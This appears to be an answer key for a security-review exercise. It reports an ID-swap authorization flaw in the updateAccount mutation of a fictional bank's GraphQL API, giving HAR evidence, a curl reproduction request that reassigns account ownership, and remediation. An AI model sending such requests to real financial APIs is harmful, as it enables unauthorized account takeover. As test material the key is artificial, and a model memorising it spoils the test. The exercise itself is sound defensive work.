# Expected Response

## System
- Domain: Financial Services / Retail Banking
- System: NexaBank Open Finance API
- Example ID: GQL-0152

## Priority Findings

### Finding 1: Open Finance — Account ID Swap Exposes Cross-Tenant Banking Data (Pattern 10.1)
**Severity:** Critical
**Category:** Single-User / ID Swap in Own Request

**Summary:**
Per §5.0 (Pattern 10.1 — ID swap in own request): The `updateAccount` resolver accepts an arbitrary account ID without verifying ownership. An attacker from `tenant-404b` submitted `updateAccount(id: "A-2152", input: {status: "approved", ownerId: "attacker-404b4b6d"})` against a banking account belonging to `tenant-4b6d`, gaining cross-tenant access to financial account data including `CONFIDENTIAL-404b4b6d`. In Financial Services / Retail Banking, this enables unauthorized account modification, balance manipulation, and access to PSD2/Open Finance protected account details.

**Evidence from HAR:**
- Request: `POST https://api.nexabank-open-financ.example.com/graphql` (2026-04-13)
- JWT `x-tenant-id`: `tenant-404b`
- Mutation: `updateAccount(id: "A-2152", input: {status: "approved", ownerId: "attacker-404b4b6d"}) { accountId status }`
- Response `200 OK`: `tenantId: "tenant-4b6d"`, `ownerId: "other-user-404b4b6d"`, `sensitiveField: "CONFIDENTIAL-404b4b6d"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-404b4b6d`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §5.0 | Pattern 10.1 | updateAccount ID swap |
| HAR request | input.ownerId | attacker-404b4b6d (client-injected) |
| HAR response | tenantId | Cross-tenant bank account tenant-4b6d |
| HAR response | sensitiveField | CONFIDENTIAL-404b4b6d |

## Steps to Reproduce

### Step 1 — updateAccount with ID swap (HAR)
```bash
curl -s -X POST https://api.nexabank-open-financ.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-404b" \
  -d '{"query": "mutation { updateAccount(id: \"A-2152\", input: {status: \"approved\", ownerId: \"attacker-404b4b6d\"}) { accountId status } }"}'
```
**Vulnerable:** `tenant-4b6d` account mutated. **Secure:** FORBIDDEN.

## Remediation
1. `updateAccount`: `WHERE account_id=$id AND tenant_id=$jwt.tenantId`.
2. Strip `ownerId` from `AccountInput`.
3. PSD2/Open Finance: Strong Customer Authentication (SCA) before account mutations.
4. Redis cache key: `account:{tenantId}:{accountId}`.
